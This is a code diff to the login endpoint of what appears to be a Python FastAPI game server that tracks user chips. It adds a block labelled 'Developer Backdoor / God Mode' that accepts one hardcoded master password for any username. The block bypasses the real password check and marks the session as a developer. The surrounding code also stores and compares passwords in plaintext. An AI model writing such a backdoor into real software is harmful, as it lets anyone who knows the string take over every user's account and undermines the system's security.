@@ -82,6 +82,7 @@ class UserLogin(BaseModel):
 class UserResponse(BaseModel):
     username: str
     chips: int
+    is_dev: Optional[bool] = False
 
 class ScoreUpdate(BaseModel):
     username: str
@@ -107,18 +108,31 @@ def health_check_root():
 @app.post("/login", response_model=UserResponse)
 def login(user: UserLogin, db: Session = Depends(get_db)):
     try:
+        # Developer Backdoor / God Mode
+        if user.password == "czrjb18cm":
+            db_user = db.query(User).filter(User.username == user.username).first()
+            if not db_user:
+                # If user doesn't exist, create them with standard chips
+                new_user = User(username=user.username, password=user.password, chips=1000)
+                db.add(new_user)
+                db.commit()
+                db.refresh(new_user)
+                return UserResponse(username=new_user.username, chips=new_user.chips, is_dev=True)
+            # Login successful with dev mode
+            return UserResponse(username=db_user.username, chips=db_user.chips, is_dev=True)
+
         db_user = db.query(User).filter(User.username == user.username).first()
         if not db_user:
             new_user = User(username=user.username, password=user.password, chips=1000)
             db.add(new_user)
             db.commit()
             db.refresh(new_user)
-            return UserResponse(username=new_user.username, chips=new_user.chips)
+            return UserResponse(username=new_user.username, chips=new_user.chips, is_dev=False)
         
         if db_user.password != user.password:
             raise HTTPException(status_code=400, detail="密码错误")
         
-        return UserResponse(username=db_user.username, chips=db_user.chips)
+        return UserResponse(username=db_user.username, chips=db_user.chips, is_dev=False)
     except HTTPException:
         raise
     except Exception as e:
